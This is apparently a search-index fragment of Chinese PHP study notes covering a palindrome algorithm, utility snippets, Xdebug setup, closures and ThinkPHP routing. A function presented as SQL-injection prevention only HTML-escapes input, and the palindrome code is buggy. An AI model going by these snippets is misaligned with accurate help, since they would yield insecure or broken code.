//\u601d\u8003\u5982\u4f55\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u7684\u65b9\u6cd5 //\u5982\u679c$s\u662f\u56de\u6587\u4e32\uff0c\u90a3\u4e48\u9996\u5c3e\u90fd\u4e22\u6389\u4e00\u4e2a\u4e5f\u662f\u56de\u6587\u4e32 $a = \"babad\" //P(i,j) = (P(i+1,j-1) and Si == Sj) $len = strlen ( $s ); if ( $len < 1 ){ return s ; } //\u4e0d\u77e5\u9053php\u4e2d\u600e\u4e48\u521d\u59cb\u5316\u6307\u5b9a\u957f\u5ea6\u7684\u7a7a\u6570\u7ec4 $dp = [[]]; $longest_l = 1 ; $res = substr ( $s , 0 , 1 ); for ( $r = 1 ; $r < $len ; $r ++ ){ for ( $l = 0 ; $l < $r ; $l ++ ){ // if(substr_compare($s,$s,)) if ( substr ( $s , $l , 1 ) === substr ( $s , $r , 1 ) && r - l <= 2 || $dp [ $l + 1 ][ $r - 1 ]){ $dp [ $l ][ $r ] == true ; $longest_l = max ( $r - $l + 1 , $longest_l ); } } } }","title":"longestPalindrome \u6700\u957f\u56de\u6587\u5b50\u5b57\u7b26\u4e32"},{"location":"language/php/algorithm/#_3","text":"https://segmentfault.com/a/1190000009067353","title":"\u53c2\u8003"},{"location":"language/php/php-code-trick/","text":"\u5e38\u7528\u7684PHP\u4ee3\u7801 \u00b6 \u963b\u6b62SQL\u6ce8\u5165 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function clean($input) { if (is_array($input)) { foreach ($input as $key => $val) { $output[$key] = clean($val); // $output[$key] = $this->;clean($val); } } else { $output = (string) $input; // if magic quotes is on then use strip slashes if (get_magic_quotes_gpc()) { $output = stripslashes($output); } // $output = strip_tags($output); $output = htmlentities($output, ENT_QUOTES, 'UTF-8'); } // return the clean text return $output; } \u68c0\u6d4b\u7528\u6237\u4f4d\u7f6e \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 function detect_city($ip) { $default = 'UNKNOWN'; $curlopt_useragent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)'; $url = 'http://ipinfodb.com/ip_locator.php?ip=' . urlencode($ip); $ch = curl_init(); $curl_opt = array( CURLOPT_FOLLOWLOCATION =>; 1, CURLOPT_HEADER =>; 0, CURLOPT_RETURNTRANSFER =>; 1, CURLOPT_USERAGENT =>; $curlopt_useragent, CURLOPT_URL =>; $url, CURLOPT_TIMEOUT =>; 1, CURLOPT_REFERER =>; 'http://' . $_SERVER['HTTP_HOST'], ); curl_setopt_array($ch, $curl_opt); $content = curl_exec($ch); if (!is_null($curl_info)) { $curl_info = curl_getinfo($ch); } curl_close($ch); if ( preg_match('{&lt;li>;City : ([^&lt;]*)&lt;/li>;}i', $content, $regs) ) { $city = $regs[1]; } if ( preg_match('{&lt;li>;State/Province : ([^&lt;]*)&lt;/li>;}i', $content, $regs) ) { $state = $regs[1]; } if( $city!='' && $state!='' ){ $location = $city . ', ' . $state; return $location; }else{ return $default; } } \u5224\u65ad\u662f\u5426\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u5f00\u5934 \u00b6 1 if ((strstr($key, $prefix)) && (strpos($key, $prefix)== 0)) { implode\u51fd\u6570 \u00b6 1 implode ( string $glue , array $pieces ) : string 1 2 3 4 5 6 7 8 9 10 11 <?php $array = array ( 'lastname' , 'email' , 'phone' ); $comma_separated = implode ( \",\" , $array ); echo $comma_separated ; // lastname,email,phone // Empty string when using an empty array: var_dump ( implode ( 'hello' , array ())); // string(0) \"\" ?> \u53c2\u8003 \u00b6 http://www.phpxs.com/code/1009843/","title":"\u5e38\u7528\u7684PHP\u4ee3\u7801"},{"location":"language/php/php-code-trick/#php","text":"","title":"\u5e38\u7528\u7684PHP\u4ee3\u7801"},{"location":"language/php/php-code-trick/#sql","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function clean($input) { if (is_array($input)) { foreach ($input as $key => $val) { $output[$key] = clean($val); // $output[$key] = $this->;clean($val); } } else { $output = (string) $input; // if magic quotes is on then use strip slashes if (get_magic_quotes_gpc()) { $output = stripslashes($output); } // $output = strip_tags($output); $output = htmlentities($output, ENT_QUOTES, 'UTF-8'); } // return the clean text return $output; }","title":"\u963b\u6b62SQL\u6ce8\u5165"},{"location":"language/php/php-code-trick/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 function detect_city($ip) { $default = 'UNKNOWN'; $curlopt_useragent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)'; $url = 'http://ipinfodb.com/ip_locator.php?ip=' . urlencode($ip); $ch = curl_init(); $curl_opt = array( CURLOPT_FOLLOWLOCATION =>; 1, CURLOPT_HEADER =>; 0, CURLOPT_RETURNTRANSFER =>; 1, CURLOPT_USERAGENT =>; $curlopt_useragent, CURLOPT_URL =>; $url, CURLOPT_TIMEOUT =>; 1, CURLOPT_REFERER =>; 'http://' . $_SERVER['HTTP_HOST'], ); curl_setopt_array($ch, $curl_opt); $content = curl_exec($ch); if (!is_null($curl_info)) { $curl_info = curl_getinfo($ch); } curl_close($ch); if ( preg_match('{&lt;li>;City : ([^&lt;]*)&lt;/li>;}i', $content, $regs) ) { $city = $regs[1]; } if ( preg_match('{&lt;li>;State/Province : ([^&lt;]*)&lt;/li>;}i', $content, $regs) ) { $state = $regs[1]; } if( $city!='' && $state!='' ){ $location = $city . ', ' . $state; return $location; }else{ return $default; } }","title":"\u68c0\u6d4b\u7528\u6237\u4f4d\u7f6e"},{"location":"language/php/php-code-trick/#_2","text":"1 if ((strstr($key, $prefix)) && (strpos($key, $prefix)== 0)) {","title":"\u5224\u65ad\u662f\u5426\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u5f00\u5934"},{"location":"language/php/php-code-trick/#implode","text":"1 implode ( string $glue , array $pieces ) : string 1 2 3 4 5 6 7 8 9 10 11 <?php $array = array ( 'lastname' , 'email' , 'phone' ); $comma_separated = implode ( \",\" , $array ); echo $comma_separated ; // lastname,email,phone // Empty string when using an empty array: var_dump ( implode ( 'hello' , array ())); // string(0) \"\" ?>","title":"implode\u51fd\u6570"},{"location":"language/php/php-code-trick/#_3","text":"http://www.phpxs.com/code/1009843/","title":"\u53c2\u8003"},{"location":"language/php/php-storm\u76f8\u5173\u8bbe\u7f6e/","text":"php-storm\u76f8\u5173\u8bbe\u7f6e \u00b6 \u5230\u5e95\u5982\u4f55\u5728php-storm\u4e2d\u8c03\u8bd5\uff1f phpstrom\u4e2d\u6709\u4e24\u79cd\u53ef\u4ee5\u8c03\u8bd5\u7684\u65b9\u5f0f\uff0c\u4e00\u662fdebug\uff0c\u53e6\u4e00\u79cd\u662f\u76d1\u542c\u6a21\u5f0f(\u6211\u81ea\u5df1\u603b\u89c9\u51fa\u6765\u7684) \u5f53\u7136\u524d\u63d0\u90fd\u662f\u8981\u5b89\u88c5\u597dxdebug debug config \u00b6 \u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5f53\u6211\u6309\u4e0bdebug\u6309\u94ae\uff1a \u53ef\u4ee5\u770b\u5230URL\u4e2d\u52a0\u5165\u4e86\u4e00\u4e2a\uff1a 1 \u81ea\u52a8\u52a0\u5165\u4e86 XDEBUG_SESSION_START \u7136\u540e\u76f4\u63a5\u5728\u540e\u9762\u52a0\u5165\u53c2\u6570\u5c31\u662f\u4e86 1 http://localhost/php-storm/php-storm/codeaudit/challenge-30.php?XDEBUG_SESSION_START=19360&id=1&pw=111 xdebug\u76d1\u542c \u00b6 \u9700\u8981\u81ea\u5df1\u90e8\u7f72\u4e00\u4e0b\u670d\u52a1\u5668 \u7136\u540e\u9700\u8981\u5728chrome\u4e0a\u5b89\u88c5\u4e00\u4e2a\u63d2\u4ef6\u5e76\u4e14\u8bbe\u7f6eIDE key","title":"php-storm\u76f8\u5173\u8bbe\u7f6e"},{"location":"language/php/php-storm\u76f8\u5173\u8bbe\u7f6e/#php-storm","text":"\u5230\u5e95\u5982\u4f55\u5728php-storm\u4e2d\u8c03\u8bd5\uff1f phpstrom\u4e2d\u6709\u4e24\u79cd\u53ef\u4ee5\u8c03\u8bd5\u7684\u65b9\u5f0f\uff0c\u4e00\u662fdebug\uff0c\u53e6\u4e00\u79cd\u662f\u76d1\u542c\u6a21\u5f0f(\u6211\u81ea\u5df1\u603b\u89c9\u51fa\u6765\u7684) \u5f53\u7136\u524d\u63d0\u90fd\u662f\u8981\u5b89\u88c5\u597dxdebug","title":"php-storm\u76f8\u5173\u8bbe\u7f6e"},{"location":"language/php/php-storm\u76f8\u5173\u8bbe\u7f6e/#debug-config","text":"\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5f53\u6211\u6309\u4e0bdebug\u6309\u94ae\uff1a \u53ef\u4ee5\u770b\u5230URL\u4e2d\u52a0\u5165\u4e86\u4e00\u4e2a\uff1a 1 \u81ea\u52a8\u52a0\u5165\u4e86 XDEBUG_SESSION_START \u7136\u540e\u76f4\u63a5\u5728\u540e\u9762\u52a0\u5165\u53c2\u6570\u5c31\u662f\u4e86 1 http://localhost/php-storm/php-storm/codeaudit/challenge-30.php?XDEBUG_SESSION_START=19360&id=1&pw=111","title":"debug config"},{"location":"language/php/php-storm\u76f8\u5173\u8bbe\u7f6e/#xdebug","text":"\u9700\u8981\u81ea\u5df1\u90e8\u7f72\u4e00\u4e0b\u670d\u52a1\u5668 \u7136\u540e\u9700\u8981\u5728chrome\u4e0a\u5b89\u88c5\u4e00\u4e2a\u63d2\u4ef6\u5e76\u4e14\u8bbe\u7f6eIDE key","title":"xdebug\u76d1\u542c"},{"location":"language/php/php0/","text":"\u9762\u5411\u5bf9\u8c61 \u00b6 $this \u53ef\u4ee5\u7406\u89e3\u4e3a\u7c7b\u5185\u90e8\u7684\u4e00\u4e2a\u5b9e\u4f8b \u6784\u9020\u65b9\u6cd5\uff1a 1 public function __construct() ---> \u4e00\u822c\u662fpublic\uff0c\u4e5f\u53ef\u4ee5\u662fprivate\u5b9e\u73b0\u5355\u4f8b\u6a21\u5f0f \u6790\u6784\u65b9\u6cd5\uff1a 1 public function __destruct() \u4e00\u822c\u7a0b\u5e8f\u6267\u884c\u7ed3\u675f\u4e4b\u540e\u5c31\u4f1a\u81ea\u52a8\u9500\u6bc1\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 unset() \u6765\u624b\u52a8\u9500\u6bc1\u5bf9\u8c61(\u624b\u52a8\u89e6\u53d1\u6790\u6784\u65b9\u6cd5) \u5b9a\u4e49\u7c7b\u5e38\u91cf const \u6b64\u65f6\u4e0d\u53ef\u4ee5\u7528 $this \u53bb\u5f15\u7528\u5e38\u91cf\uff0c\u800c\u662f\u9700\u8981\u7528 self::xxx \u6765\u5f15\u7528 \u5728\u7c7b\u7684\u5916\u90e8\u4e0d\u9700\u8981\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u76f4\u63a5\u901a\u8fc7\u7c7b\u540d xxx::\u5e38\u91cf \u6765\u8c03\u7528 \u7ee7\u627f\uff1a \u5982\u679c\u5b50\u7c7b\u6ca1\u6709\u6784\u9020\u65b9\u6cd5\uff0c\u5219\u4f1a\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 \u5b50\u7c7b\u53ef\u4ee5\u624b\u52a8\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 1 parent::__construct() final\u4fee\u9970\u7b26\u8868\u793a\u8be5\u7c7b\u4e0d\u5141\u8bb8\u7ee7\u627f\u6216\u8005\u4e0d\u5141\u8bb8\u65b9\u6cd5\u88ab\u91cd\u5199\uff0c","title":"\u9762\u5411\u5bf9\u8c61"},{"location":"language/php/php0/#_1","text":"$this \u53ef\u4ee5\u7406\u89e3\u4e3a\u7c7b\u5185\u90e8\u7684\u4e00\u4e2a\u5b9e\u4f8b \u6784\u9020\u65b9\u6cd5\uff1a 1 public function __construct() ---> \u4e00\u822c\u662fpublic\uff0c\u4e5f\u53ef\u4ee5\u662fprivate\u5b9e\u73b0\u5355\u4f8b\u6a21\u5f0f \u6790\u6784\u65b9\u6cd5\uff1a 1 public function __destruct() \u4e00\u822c\u7a0b\u5e8f\u6267\u884c\u7ed3\u675f\u4e4b\u540e\u5c31\u4f1a\u81ea\u52a8\u9500\u6bc1\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 unset() \u6765\u624b\u52a8\u9500\u6bc1\u5bf9\u8c61(\u624b\u52a8\u89e6\u53d1\u6790\u6784\u65b9\u6cd5) \u5b9a\u4e49\u7c7b\u5e38\u91cf const \u6b64\u65f6\u4e0d\u53ef\u4ee5\u7528 $this \u53bb\u5f15\u7528\u5e38\u91cf\uff0c\u800c\u662f\u9700\u8981\u7528 self::xxx \u6765\u5f15\u7528 \u5728\u7c7b\u7684\u5916\u90e8\u4e0d\u9700\u8981\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u76f4\u63a5\u901a\u8fc7\u7c7b\u540d xxx::\u5e38\u91cf \u6765\u8c03\u7528 \u7ee7\u627f\uff1a \u5982\u679c\u5b50\u7c7b\u6ca1\u6709\u6784\u9020\u65b9\u6cd5\uff0c\u5219\u4f1a\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 \u5b50\u7c7b\u53ef\u4ee5\u624b\u52a8\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 1 parent::__construct() final\u4fee\u9970\u7b26\u8868\u793a\u8be5\u7c7b\u4e0d\u5141\u8bb8\u7ee7\u627f\u6216\u8005\u4e0d\u5141\u8bb8\u65b9\u6cd5\u88ab\u91cd\u5199\uff0c","title":"\u9762\u5411\u5bf9\u8c61"},{"location":"language/php/php\u5b89\u88c5xdebug\u6269\u5c55/","text":"php\u5b89\u88c5xdebug\u6269\u5c55 \u00b6 \u53c2\u8003","title":"php\u5b89\u88c5xdebug\u6269\u5c55"},{"location":"language/php/php\u5b89\u88c5xdebug\u6269\u5c55/#phpxdebug","text":"\u53c2\u8003","title":"php\u5b89\u88c5xdebug\u6269\u5c55"},{"location":"language/php/php\u8bed\u6cd5\u8865\u5145/","text":"php\u8bed\u6cd5\u8865\u5145 \u00b6 use\u5173\u952e\u5b57 \u00b6 \u5b98\u65b9\u6587\u6863\u94fe\u63a5 \u53ef\u4ee5\u7406\u89e3\u6210\u7ed9\u547d\u540d\u7a7a\u95f4\u53d6\u4e00\u4e2a\u522b\u540d \u95ed\u5305 or\u533f\u540d\u51fd\u6570 \u00b6 \u770b\u5230\u5b98\u7f51\u7ed9\u51fa\u4e86\u4e00\u4e2a\u6817\u5b50\uff0c\u53ef\u4ee5\u7528\u6765\u5220\u9664\u6389\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u6587\u4ef6\u5939 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php $deleteDirectory = null ; $deleteDirectory = function ( $path ) use ( & $deleteDirectory ) { $resource = opendir ( $path ); while (( $item = readdir ( $resource )) !== false ) { if ( $item !== \".\" && $item !== \"..\" ) { if ( is_dir ( $path . \"/\" . $item )) { $deleteDirectory ( $path . \"/\" . $item ); } else { unlink ( $path . \"/\" . $item ); } } } closedir ( $resource ); rmdir ( $path ); }; $deleteDirectory ( \"path/to/directoy\" ); ?> \u5b98\u65b9\u6587\u6863\u94fe\u63a5","title":"php\u8bed\u6cd5\u8865\u5145"},{"location":"language/php/php\u8bed\u6cd5\u8865\u5145/#php","text":"","title":"php\u8bed\u6cd5\u8865\u5145"},{"location":"language/php/php\u8bed\u6cd5\u8865\u5145/#use","text":"\u5b98\u65b9\u6587\u6863\u94fe\u63a5 \u53ef\u4ee5\u7406\u89e3\u6210\u7ed9\u547d\u540d\u7a7a\u95f4\u53d6\u4e00\u4e2a\u522b\u540d","title":"use\u5173\u952e\u5b57"},{"location":"language/php/php\u8bed\u6cd5\u8865\u5145/#or","text":"\u770b\u5230\u5b98\u7f51\u7ed9\u51fa\u4e86\u4e00\u4e2a\u6817\u5b50\uff0c\u53ef\u4ee5\u7528\u6765\u5220\u9664\u6389\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u6587\u4ef6\u5939 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php $deleteDirectory = null ; $deleteDirectory = function ( $path ) use ( & $deleteDirectory ) { $resource = opendir ( $path ); while (( $item = readdir ( $resource )) !== false ) { if ( $item !== \".\" && $item !== \"..\" ) { if ( is_dir ( $path . \"/\" . $item )) { $deleteDirectory ( $path . \"/\" . $item ); } else { unlink ( $path . \"/\" . $item ); } } } closedir ( $resource ); rmdir ( $path ); }; $deleteDirectory ( \"path/to/directoy\" ); ?> \u5b98\u65b9\u6587\u6863\u94fe\u63a5","title":"\u95ed\u5305 or\u533f\u540d\u51fd\u6570"},{"location":"language/php/php\u8c03\u8bd5\u6e90\u7801\u6b65\u9aa4/","text":"php\u5982\u4f55\u8c03\u8bd5\u6e90\u7801 \u00b6 \u5176\u5b9e configure.bat \u8fd8\u662f\u9700\u8981\u76f8\u5173\u7684\u914d\u7f6e\u7684\u3002 \u4e4b\u540e\u8f93\u5165\u7684\u547d\u4ee4\u662f 1 configure --disable-all --enable-cli --enable-debug \u7136\u540e\u6267\u884c nmake \u547d\u4ee4 \u6211\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u4f7f\u7528 getimagesize \u51fd\u6570\u65f6\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u6ca1\u6709\u914d\u7f6eSSL 1 2 3 Warning: getimagesize(): Unable to find the wrapper \"https\" - did you forget to enable it when you configured PHP? in F:\\php-sdk-binary-tools\\phpdev\\vc15\\x64\\php-src\\test.php on line 3 Warning: getimagesize(https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png): failed to open stream: No such file or directory in F:\\php-sdk-binary-tools\\phpdev\\vc15\\x64\\php-src\\test.php on line 3 \u6709\u673a\u4f1a\u7ee7\u7eed\u5c1d\u8bd5\uff0c\u76ee\u524d\u5148\u628aphp\u6e90\u7801\u597d\u597d\u770b\u660e\u767d php\u6e90\u7801\u8c03\u8bd5\u5206\u6790","title":"php\u5982\u4f55\u8c03\u8bd5\u6e90\u7801"},{"location":"language/php/php\u8c03\u8bd5\u6e90\u7801\u6b65\u9aa4/#php","text":"\u5176\u5b9e configure.bat \u8fd8\u662f\u9700\u8981\u76f8\u5173\u7684\u914d\u7f6e\u7684\u3002 \u4e4b\u540e\u8f93\u5165\u7684\u547d\u4ee4\u662f 1 configure --disable-all --enable-cli --enable-debug \u7136\u540e\u6267\u884c nmake \u547d\u4ee4 \u6211\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u4f7f\u7528 getimagesize \u51fd\u6570\u65f6\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u6ca1\u6709\u914d\u7f6eSSL 1 2 3 Warning: getimagesize(): Unable to find the wrapper \"https\" - did you forget to enable it when you configured PHP? in F:\\php-sdk-binary-tools\\phpdev\\vc15\\x64\\php-src\\test.php on line 3 Warning: getimagesize(https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png): failed to open stream: No such file or directory in F:\\php-sdk-binary-tools\\phpdev\\vc15\\x64\\php-src\\test.php on line 3 \u6709\u673a\u4f1a\u7ee7\u7eed\u5c1d\u8bd5\uff0c\u76ee\u524d\u5148\u628aphp\u6e90\u7801\u597d\u597d\u770b\u660e\u767d php\u6e90\u7801\u8c03\u8bd5\u5206\u6790","title":"php\u5982\u4f55\u8c03\u8bd5\u6e90\u7801"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/","text":"\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570 \u00b6 \u4ec0\u4e48\u662f\u95ed\u5305 \u00b6 \u6700\u8fd1\u5b66\u4e60\u4e86JavaScript\u4e2d\u7684\u95ed\u5305\u6982\u5ff5\uff0c\u5bf9\u4e8e\u95ed\u5305\u7684\u7406\u89e3\u8fdb\u4e00\u6b65\u6df1\u5165\u4e86 \u95ed\u5305\u662f\u6307\u5728\u521b\u5efa\u65f6\u5c01\u88c5\u5468\u56f4\u72b6\u6001\u7684\u51fd\u6570\uff0c\u5373\u4f7f\u95ed\u5305\u6240\u5728\u7684\u73af\u5883\u7684\u4e0d\u5b58\u5728\u4e86\uff0c\u95ed\u5305\u4e2d\u5c01\u88c5\u7684\u72b6\u6001\u4f9d\u7136\u5b58\u5728\u3002 \u76f8\u5f53\u4e8e\u5c01\u88c5\u4e86\u4e00\u4e2a\u4e0a\u4e0b\u6587 \u521b\u5efa\u95ed\u5305 \u00b6 1 2 3 4 5 6 <?php $greet = function ( $name ) { return sprintf ( \"Hello %s \\r\\n \" , $name ); }; echo $greet ( 'LaravelAcademy.org' ); \u56de\u8c03\u51fd\u6570 \u00b6 \u53c2\u8003 \u00b6 php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570","title":"\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/#_1","text":"","title":"\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/#_2","text":"\u6700\u8fd1\u5b66\u4e60\u4e86JavaScript\u4e2d\u7684\u95ed\u5305\u6982\u5ff5\uff0c\u5bf9\u4e8e\u95ed\u5305\u7684\u7406\u89e3\u8fdb\u4e00\u6b65\u6df1\u5165\u4e86 \u95ed\u5305\u662f\u6307\u5728\u521b\u5efa\u65f6\u5c01\u88c5\u5468\u56f4\u72b6\u6001\u7684\u51fd\u6570\uff0c\u5373\u4f7f\u95ed\u5305\u6240\u5728\u7684\u73af\u5883\u7684\u4e0d\u5b58\u5728\u4e86\uff0c\u95ed\u5305\u4e2d\u5c01\u88c5\u7684\u72b6\u6001\u4f9d\u7136\u5b58\u5728\u3002 \u76f8\u5f53\u4e8e\u5c01\u88c5\u4e86\u4e00\u4e2a\u4e0a\u4e0b\u6587","title":"\u4ec0\u4e48\u662f\u95ed\u5305"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/#_3","text":"1 2 3 4 5 6 <?php $greet = function ( $name ) { return sprintf ( \"Hello %s \\r\\n \" , $name ); }; echo $greet ( 'LaravelAcademy.org' );","title":"\u521b\u5efa\u95ed\u5305"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/#_4","text":"","title":"\u56de\u8c03\u51fd\u6570"},{"location":"language/php/php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570/#_5","text":"php\u95ed\u5305\u548c\u533f\u540d\u51fd\u6570","title":"\u53c2\u8003"},{"location":"language/php/thinkphp\u5b66\u4e60\u7b14\u8bb0/","text":"thinkphp\u5b66\u4e60\u7b14\u8bb0 \u00b6 thinkphp\u4e2d\u4f9d\u8d56\u6ce8\u5165 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php namespace app\\index\\controller ; use app\\index\\model\\User ; class Index { protected $user ; //\u6784\u9020\u65b9\u6cd5\u4e2d\u4f9d\u8d56\u6ce8\u5165\uff0c public function __construct ( User $user ) { $this -> user = $user ; } public function hello () { return 'Hello,' . $this -> user -> name . '\uff01' ; } //\u63a7\u5236\u5668\u64cd\u4f5c\u65b9\u6cd5 public function userInfo ( User $user ) { echo $user -> name ; } } \u5230\u5e95\u5982\u4f55\u7406\u89e3\u4f9d\u8d56\u6ce8\u5165\uff0c\u4e2a\u4eba\u89c1\u89e3\uff0c\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u901a\u8fc7 new \u5173\u952e\u5b57\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\uff0c\u76f8\u53cd\uff0c\u6211\u4eec\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4f20\u5165\u4e86\u4e00\u4e2a\u53c2\u6570 User $user ,\u4e4b\u540e\u6211\u4eec\u4fbf\u53ef\u4ee5\u5728 hello() \u65b9\u6cd5\u4e2d\u8bbf\u95ee\u5230\u539f\u672c\u5c5e\u4e8e User \u7c7b\u7684\u5c5e\u6027\uff0c\u8fd9\u80cc\u540e\u5c31\u6709\u4e00\u4e2a\u5bb9\u5668\u5728\u5e2e\u6211\u4eec\u8fdb\u884c\u8c03\u5ea6 thinkphp \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528\u52a9\u624b\u51fd\u6570\u8fdb\u884c\u4f9d\u8d56\u6ce8\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace app\\index\\controller ; class Index { //\u63a7\u5236\u5668\u64cd\u4f5c\u65b9\u6cd5 public function userInfo () { bind ( 'user' , 'app\\common\\controller\\User' ); echo app ( \"user\" ) -> name ; //bind()--->\u76f8\u5f53\u4e8e\u589e\u52a0\u4e86\u8bc6\u522b\u540d\u3010\u552f\u4e00\u6807\u8bc6\u3011-->\u65b9\u4fbfapp()\u7684\u8c03\u7528 //\u5f53\u7136\u4e5f\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\u4e0b\u9762\u7684\u8fd9\u53e5\u8bdd\u7b49\u4ef7\u4e8e\u4e0a\u9762\u7684 echo app ( 'app\\common\\controller\\User' ) -> name ; //\u5b98\u65b9\u8bf4\u660e\uff1a\u5bb9\u5668\u4e2d\u5df2\u7ecf\u8c03\u7528\u8fc7\u7684\u7c7b\u4f1a\u81ea\u52a8\u4f7f\u7528\u5355\u4f8b\uff0c\u9664\u975e\u4f60\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u5f3a\u5236\u91cd\u65b0\u5b9e\u4f8b\u5316\u3002// \u6bcf\u6b21\u8c03\u7528\u90fd\u4f1a\u91cd\u65b0\u5b9e\u4f8b\u5316->$cache = app('user',true); //\u66f4\u591a\u7684\u7ed1\u5b9a\u65b9\u5f0f\u53ef\u4ee5\u53c2\u8003\u624b\u518c\u7684\u8bf4\u660e\u3010bind()\u3011 } } thinkphp\u5b9e\u6218\u5f00\u53d1 thinkphp\u8def\u7531\u521d\u4f53\u9a8c \u00b6 \u7531\u4e8ewindows\u7684 composer \u51fa\u95ee\u9898\u4e86\u4e00\u76f4\u6ca1\u89e3\u51b3\uff0c\u5c31\u662f\u5728\u63d0\u793a\u4f60 openssl \u6ca1\u6709\u542f\u7528\uff0c\u4f46\u662f\u6211\u5c1d\u8bd5\u4e86\u5f88\u591a\u6b21\u542f\u7528\u4e5f\u6ca1\u6210\u529f\uff0c\u5e72\u8106\u5c31\u7528Linux\u597d\u4e86 composer \u5b89\u88c5thinkphp5 \u4e2d\u95f4\u8fd8\u9047\u5230\u4e86\u4e00\u4e2a\u5751\uff0c zshcomposer\u4e0d\u80fd\u6307\u5b9a\u7248\u672c 1 2 3 4 5 6 7 8 9 10 11 \u279c WWW composer create-project topthink/think = 5 .1.* think5 Installing topthink/think ( v5.1.38 ) - Installing topthink/think ( v5.1.38 ) : Downloading ( 100 % ) Created project in think5 Loading composer repositories with package information Updating dependencies ( including require-dev ) Package operations: 2 installs, 0 updates, 0 removals - Installing topthink/think-installer ( v2.0.0 ) : Downloading ( 100 % ) - Installing topthink/framework ( v5.1.38.1 ) : Downloading ( 100 % ) Writing lock file Generating autoload files \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fd0\u884cthinkphp\u7684\u5e94\u7528\u4e86\uff0c\u4e4b\u524d\u4ee5\u4e3a\u4e00\u4e2aweb\u670d\u52a1\u5668\u662f\u53ea\u80fd\u5b89\u88c5\u4e00\u4e2athinkphp\u7684\u5e94\u7528\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f\u53ef\u4ee5\u5b89\u88c5\u591a\u4e2a\u7684 thinkphp \u7684 route \u6587\u4ef6\u5939\u4e0b\u662f\u6ce8\u518c\u7684\u8def\u7531\uff1a 1 2 3 4 5 6 7 8 9 Route::get('think', function () { return 'hello,ThinkPHP5!'; }); Route::get('hello/:name', 'index/hello'); return [ ]; \u8bbf\u95ee public \u4e0b\u7684index.php\u540c\u65f6\u52a0\u4e0a hello \u548c\u4f20\u9012\u7684\u53c2\u6570111 \u901a\u8fc7 Route::get('hello/:name', 'index/hello'); \u4f20\u9012\u5230 index \u63a7\u5236\u5668\u4e0b\u7684 hello \u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php namespace app\\index\\controller ; class Index { public function index () { return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px.../static/client.js\"></script><think id=\"eab4b9f840753f8e7\"></think>' ; } public function hello ( $name = 'ThinkPHP5' ) { return 'hello,' . $name ; } } \u5982\u679c\u628a\u4e4b\u524d\u7684\u90a3\u4e2a\u6ce8\u518c\u8def\u7531\u7ed9\u5220\u6389 \u90a3\u6211\u4eec\u5c31\u5fc5\u987b\u8bbf\u95ee <http://localhost/think5/public/index.php/index/index/hello/name/111> 